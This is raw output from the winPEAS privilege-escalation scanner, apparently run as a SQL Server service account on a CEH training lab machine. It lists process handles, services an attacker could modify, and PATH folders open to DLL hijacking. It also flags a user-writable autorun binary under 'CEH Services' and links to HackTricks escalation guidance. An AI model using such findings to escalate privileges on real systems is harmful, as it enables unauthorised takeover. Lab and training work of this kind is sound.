    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================



                                   ͹ Services Information                                      

          ͹ Interesting Services -non Microsoft-
  Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    AdobeARMservice(Adobe Inc. - Adobe Acrobat Update Service)["C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe"] - Auto - Running
    Adobe Acrobat Updater keeps your Adobe software up to date.
   =================================================================================================

    GoogleChromeElevationService(Google LLC - Google Chrome Elevation Service (GoogleChromeElevationService))["C:\Program Files (x86)\Google\Chrome\Application\138.0.7204.97\elevation_service.exe"] - Manual - Stopped
    Provides encryption services and a secure way for recovering Google Chrome if it gets out of date. If this service is disabled,  may lose access to encrypted data, and  may not be able to recover itself.
   =================================================================================================

    GoogleUpdaterInternalService131.0.6776.0(Google LLC - Google Updater Internal Service (GoogleUpdaterInternalService131.0.6776.0))["C:\Program Files (x86)\Google\GoogleUpdater\131.0.6776.0\updater.exe" --system --windows-service --service=update-internal] - Auto - Stopped
    Keeps your Google software up to date. If this service is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Google software using it.
   =================================================================================================

    GoogleUpdaterService131.0.6776.0(Google LLC - Google Updater Service (GoogleUpdaterService131.0.6776.0))["C:\Program Files (x86)\Google\GoogleUpdater\131.0.6776.0\updater.exe" --system --windows-service --service=update] - Auto - Stopped
    Keeps your Google software up to date. If this service is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Google software using it.
   =================================================================================================

    MozillaMaintenance(Mozilla Foundation - Mozilla Maintenance Service)["C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"] - Manual - Stopped
    The Mozilla Maintenance Service ensures that you have the latest and most secure version of Mozilla Firefox on your computer. Keeping Firefox up to date is very important for your online security, and Mozilla strongly recommends that you keep this service enabled.
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    GoogleUpdaterInternalService140.0.7272.0(Google LLC - Google Updater Internal Service (GoogleUpdaterInternalService140.0.7272.0))["C:\Program Files (x86)\Google\GoogleUpdater\140.0.7272.0\updater.exe" --system --windows-service --service=update-internal] - Auto - Stopped
    Keeps your Google software up to date. If this service is disabled or stopped, your Google software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This service uninstalls itself when there is no Google software using it.
   =================================================================================================


          ͹ Modifiable Services
  Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)

          ͹ Looking if you can modify any service registry
  Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions
    [-] Looks like you cannot change the registry of any service...

          ͹ Checking write permissions in PATH folders (DLL Hijacking)
  Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking
    C:\Program Files\Microsoft MPI\Bin\
    C:\Program Files (x86)\Common Files\Oracle\Java\javapath
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files (x86)\Microsoft SQL Server\160\DTS\Binn\
    C:\Program Files (x86)\Microsoft SQL Server\160\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\160\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\160\DTS\Binn\


                                   ͹ Applications Information                                      

          ͹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

          ͹ Installed Applications --Via Program Files/Uninstall registry--
  Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:\Program Files\CEH Services(Users [AllAccess])
    C:\Program Files\chrome_installer.log
    C:\Program Files\chrome_url_fetcher_5748_433740753
    C:\Program Files\Common Files
    C:\Program Files\Crashpad
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Java
    C:\Program Files\Learn on Demand Systems
    C:\Program Files\Microsoft
    C:\Program Files\Microsoft Analysis Services
    C:\Program Files\Microsoft MPI
    C:\Program Files\Microsoft SQL Server
    C:\Program Files\Microsoft Visual Studio 10.0
    C:\Program Files\Microsoft.NET
    C:\Program Files\Mozilla Firefox
    C:\Program Files\MSBuild
    C:\Program Files\Npcap
    C:\Program Files\Reference Assemblies
    C:\Program Files\Uninstall Information
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell
    C:\Program Files\WinRAR
    C:\Program Files\Wireshark


          ͹ Autorun Applications
  Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: SecurityHealth
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: Services
    Folder: C:\Program Files\CEH Services
    FolderPerms: Users [AllAccess]
    File: C:\Program Files\CEH Services\file.exe (Unquoted and Space detected)
    FilePerms: Users [AllAccess]
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
    Key: SunJavaUpdateSched
    Folder: C:\Program Files (x86)\Common Files\Java\Java Update
    File: C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{8A69D345-D564-463c-AFF1-A69D9E530F96}
    Key: StubPath
    Folder: C:\Program Files (x86)\Google\Chrome\Application\138.0.7204.97\Installer
    File: C:\Program Files (x86)\Google\Chrome\Application\138.0.7204.97\Installer\chrmstp.exe --configure-user-settings --verbose-logging --system-level --channel=stable (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
